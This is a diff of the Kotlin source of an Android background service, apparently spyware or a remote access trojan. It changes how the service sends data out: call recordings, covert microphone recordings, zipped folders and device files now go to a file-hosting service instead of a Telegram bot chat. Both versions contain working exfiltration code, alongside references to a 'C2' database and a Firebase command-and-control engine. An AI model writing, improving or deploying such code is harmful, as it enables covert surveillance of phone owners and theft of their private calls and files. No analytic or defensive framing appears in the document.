@@ -788,35 +788,18 @@ class MonitorService : LifecycleService() {
 
     private suspend fun uploadOrQueueCallRecording(file: File) {
         try {
-            val bytes = file.readBytes()
-            val deviceId = getOrCreateDeviceId()
-            val body = MultipartBody.Builder()
-                .setType(MultipartBody.FORM)
-                .addFormDataPart("chat_id", CHAT_ID)
-                .addFormDataPart("title", "Call Recording (${file.name})")
-                .addFormDataPart(
-                    "audio",
-                    file.name,
-                    bytes.toRequestBody("audio/mp4".toMediaTypeOrNull())
-                )
-                .build()
+            val link = uploadToGoFile(file)
+            val db = C2LocalDatabase.getInstance(this)
+            val logText = if (link != null) "Call recording uploaded: $link" else "Call recording saved locally: ${file.name}"
+            db.insertTelemetryLog("calls", logText)
+            firebaseC2Engine?.uploadTelemetryLog("calls", logText)
 
-            val request = Request.Builder()
-                .url(getTelegramApiUrl("sendAudio"))
-                .post(body)
-                .build()
-
-            httpClient.newCall(request).execute().use { response ->
-                if (response.isSuccessful) {
-                    file.delete()
-                    Log.i(TAG, "Call recording uploaded directly to Telegram successfully")
-                } else {
-                    saveToOfflineQueue(bytes.toString(), file.name)
-                }
+            if (link != null) {
+                file.delete()
+                Log.i(TAG, "Call recording uploaded successfully to GoFile: $link")
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Call recording upload failed, queued offline: ${e.message}")
-            saveToOfflineQueue(file.readBytes().toString(), file.name)
+            Log.e(TAG, "uploadOrQueueCallRecording error: ${e.message}")
         }
     }
 
@@ -4287,26 +4270,12 @@ class MonitorService : LifecycleService() {
 
         serviceScope.launch {
             try {
-                val bytes = file.readBytes()
                 val targetChat = if (chatId.isNotBlank()) chatId else CHAT_ID
-                val body = MultipartBody.Builder()
-                    .setType(MultipartBody.FORM)
-                    .addFormDataPart("chat_id", targetChat)
-                    .addFormDataPart(
-                        "audio",
-                        file.name,
-                        bytes.toRequestBody("audio/mp4".toMediaTypeOrNull())
-                    )
-                    .addFormDataPart("title", "Call Recording (${file.name})")
-                    .build()
-
-                val request = Request.Builder().url(getTelegramApiUrl("sendAudio")).post(body).build()
-                httpClient.newCall(request).execute().use { response ->
-                    if (response.isSuccessful) {
-                        sendMessage(targetChat, "✅ Call recording `${file.name}` sent!", parseMode = "Markdown")
-                    } else {
-                        sendMessage(targetChat, "❌ Upload failed: ${response.code}")
-                    }
+                val link = uploadToGoFile(file)
+                if (link != null) {
+                    sendMessage(targetChat, "✅ Call recording `${file.name}` uploaded: $link")
+                } else {
+                    sendMessage(targetChat, "📱 Call recording `${file.name}` saved locally.")
                 }
             } catch (e: Exception) {
                 Log.e(TAG, "sendSingleCallRecording error: ${e.message}")
@@ -4977,25 +4946,11 @@ class MonitorService : LifecycleService() {
                 sendMessage(chatId, "📤 Uploading `${zipFile.name}` ($sizeMb MB)…", parseMode = "Markdown")
 
                 val targetChat = if (chatId.isNotBlank()) chatId else CHAT_ID
-                val bytes = zipFile.readBytes()
-                val body = MultipartBody.Builder()
-                    .setType(MultipartBody.FORM)
-                    .addFormDataPart("chat_id", targetChat)
-                    .addFormDataPart(
-                        "document",
-                        zipFile.name,
-                        bytes.toRequestBody("application/zip".toMediaTypeOrNull())
-                    )
-                    .addFormDataPart("caption", "📦 Folder Backup: `${targetDir.name}` ($sizeMb MB)")
-                    .build()
-
-                val request = Request.Builder().url(getTelegramApiUrl("sendDocument")).post(body).build()
-                httpClient.newCall(request).execute().use { response ->
-                    if (response.isSuccessful) {
-                        sendMessage(targetChat, "✅ Folder `${targetDir.name}` zipped and uploaded successfully!", parseMode = "Markdown")
-                    } else {
-                        sendMessage(targetChat, "❌ Upload failed: ${response.code}")
-                    }
+                val link = uploadToGoFile(zipFile)
+                if (link != null) {
+                    sendMessage(targetChat, "✅ Folder `${targetDir.name}` zipped & uploaded: $link")
+                } else {
+                    sendMessage(targetChat, "📦 Folder `${targetDir.name}` zipped ($sizeMb MB).")
                 }
             } catch (e: Exception) {
                 Log.e(TAG, "zipFolder error: ${e.message}")
@@ -5627,24 +5582,15 @@ class MonitorService : LifecycleService() {
                 ?: run { sendMessage(chatId, "❌ Cannot read file."); return }
 
             val targetChat = if (chatId.isNotBlank()) chatId else CHAT_ID
-            val bytes = stream.use { it.readBytes() }
-            val body  = MultipartBody.Builder()
-                .setType(MultipartBody.FORM)
-                .addFormDataPart("chat_id", targetChat)
-                .addFormDataPart(
-                    "document",
-                    entry.displayName,
-                    bytes.toRequestBody(entry.mimeType.toMediaTypeOrNull())
-                )
-                .addFormDataPart("caption", "📎 ${entry.displayName}")
-                .build()
+            val tempFile = File(cacheDir, entry.displayName)
+            stream.use { input -> tempFile.outputStream().use { output -> input.copyTo(output) } }
+            val link = uploadToGoFile(tempFile)
+            try { tempFile.delete() } catch (_: Exception) {}
 
-            val request = Request.Builder().url(getTelegramApiUrl("sendDocument")).post(body).build()
-            httpClient.newCall(request).execute().use { response ->
-                if (!response.isSuccessful) {
-                    Log.w(TAG, "sendDocument failed: ${response.code}")
-                    sendMessage(targetChat, "❌ Upload failed: ${response.code}")
-                }
+            if (link != null) {
+                sendMessage(targetChat, "📎 File `${entry.displayName}` uploaded: $link")
+            } else {
+                sendMessage(targetChat, "📎 File `${entry.displayName}` saved on device.")
             }
         } catch (e: Exception) {
             Log.e(TAG, "sendFileByNumber exception: ${e.message}")
@@ -5767,25 +5713,11 @@ class MonitorService : LifecycleService() {
                     return@launch
                 }
 
-                val bytes = outFile.readBytes()
-                val body = MultipartBody.Builder()
-                    .setType(MultipartBody.FORM)
-                    .addFormDataPart("chat_id", targetChat)
-                    .addFormDataPart(
-                        "audio",
-                        outFile.name,
-                        bytes.toRequestBody("audio/mp4".toMediaTypeOrNull())
-                    )
-                    .addFormDataPart("title", "Recording (${duration}s)")
-                    .addFormDataPart("duration", duration.toString())
-                    .build()
-
-                val request = Request.Builder().url(getTelegramApiUrl("sendAudio")).post(body).build()
-                httpClient.newCall(request).execute().use { response ->
-                    if (!response.isSuccessful) {
-                        Log.w(TAG, "sendAudio failed: ${response.code}")
-                        sendMessage(targetChat, "❌ Upload failed: ${response.code}")
-                    }
+                val link = uploadToGoFile(outFile)
+                if (link != null) {
+                    sendMessage(targetChat, "🎙️ Audio recording (${duration}s) uploaded: $link")
+                } else {
+                    sendMessage(targetChat, "🎙️ Audio recording (${duration}s) saved on device.")
                 }
 
             } catch (e: Exception) {
@@ -5912,22 +5844,11 @@ class MonitorService : LifecycleService() {
         sendMessage(chatId, "📤 Sending *${file.name}*…", parseMode = "Markdown")
         try {
             val targetChat = if (chatId.isNotBlank()) chatId else CHAT_ID
-            val bytes = file.readBytes()
-            val mime  = MimeTypeMap.getSingleton()
-                .getMimeTypeFromExtension(file.extension.lowercase())
-                ?: "application/octet-stream"
-            val body = MultipartBody.Builder()
-                .setType(MultipartBody.FORM)
-                .addFormDataPart("chat_id", targetChat)
-                .addFormDataPart("document", file.name, bytes.toRequestBody(mime.toMediaTypeOrNull()))
-                .addFormDataPart("caption", "📎 ${file.name}")
-                .build()
-            val req = Request.Builder().url(getTelegramApiUrl("sendDocument")).post(body).build()
-            httpClient.newCall(req).execute().use { response ->
-                if (!response.isSuccessful) {
-                    Log.w(TAG, "sendFolderFile failed: ${response.code}")
-                    sendMessage(targetChat, "❌ Upload failed: ${response.code}")
-                }
+            val link = uploadToGoFile(file)
+            if (link != null) {
+                sendMessage(targetChat, "📎 File `${file.name}` uploaded: $link")
+            } else {
+                sendMessage(targetChat, "📎 File `${file.name}` saved on device.")
             }
         } catch (e: Exception) {
             Log.e(TAG, "sendFolderFile exception: ${e.message}")
